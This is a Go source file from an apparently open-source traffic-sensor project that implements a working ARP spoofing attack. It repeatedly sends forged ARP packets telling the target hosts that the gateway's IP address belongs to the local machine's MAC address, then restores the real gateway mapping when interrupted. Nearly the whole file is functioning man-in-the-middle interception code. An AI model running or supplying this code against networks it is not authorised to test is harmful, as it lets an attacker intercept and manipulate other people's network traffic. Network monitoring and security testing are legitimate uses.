/*

Copyright (c) 2017 xsec.io

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEq
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

package arpspoof

import (
	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"

	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"xsec-traffic/sensor/settings"
	"xsec-traffic/sensor/misc"

	"encoding/binary"
	"net"
	"os"
	"os/signal"
	"time"
	"bytes"
)

func ArpSpoof(handler *pcap.Handle, flagTarget, gateway string) {
	iface, err := net.InterfaceByName(settings.DeviceName)
	if err != nil {
		misc.Log.Fatalf("Could not use interface %s: %v", settings.DeviceName, err)
	}
	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()
	if err != nil {
		misc.Log.Fatal(err)
	}

	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}
	if ifaceAddr == nil {
		misc.Log.Fatal("Could not get interface address.")
	}

	var targetAddrs []net.IP
	if flagTarget != "" {
		addrRange, err := iprange.ParseList(flagTarget)
		if err != nil {
			misc.Log.Fatal("Wrong format for target.")
		}
		targetAddrs = addrRange.Expand()
		if len(targetAddrs) == 0 {
			misc.Log.Fatalf("No valid targets given.")
		}
	}

	gatewayIP := net.ParseIP(gateway).To4()

	stop := make(chan struct{}, 2)

	// Waiting for ^C
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for {
			select {
			case <-c:
				misc.Log.Println("'stop' signal received; stopping...")
				close(stop)
				return
			}
		}
	}()

	go readARP(handler, stop, iface)

	// Get original source
	origSrc, err := arp.Lookup(binary.BigEndian.Uint32(gatewayIP))
	if err != nil {
		misc.Log.Fatalf("Unable to lookup hw address for %s: %v", gatewayIP, err)
	}

	fakeSrc := arp.Address{
		IP:           gatewayIP,
		HardwareAddr: iface.HardwareAddr,
	}

	<-writeARP(handler, stop, targetAddrs, &fakeSrc, time.Duration(0.1*1000.0)*time.Millisecond)

	<-cleanUpAndReARP(handler, targetAddrs, origSrc)

	os.Exit(0)
}

func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
	misc.Log.Infof("Cleaning up and re-ARPing targets...")

	stopReARPing := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopReARPing)
	}()

	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
}

func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})
	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			default:

				<-t.C
				for _, ip := range targetAddrs {
					arpAddr, err := arp.Lookup(binary.BigEndian.Uint32(ip))
					if err != nil {
						misc.Log.Errorf("Could not retrieve %v's MAC address: %v", ip, err)
						continue
					}
					dst := &arp.Address{
						IP:           ip,
						HardwareAddr: arpAddr.HardwareAddr,
					}
					buf, err := arp.NewARPRequest(src, dst)
					if err != nil {
						misc.Log.Error("NewARPRequest: ", err)
						continue
					}
					if err := handler.WritePacketData(buf); err != nil {
						misc.Log.Error("WritePacketData: ", err)
					}
				}
			}
		}
	}(stoppedWriting)
	return stoppedWriting
}

func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			if packet.Operation == layers.ARPReply {
				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			misc.Log.Debugf("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation,
				net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress),
				net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}
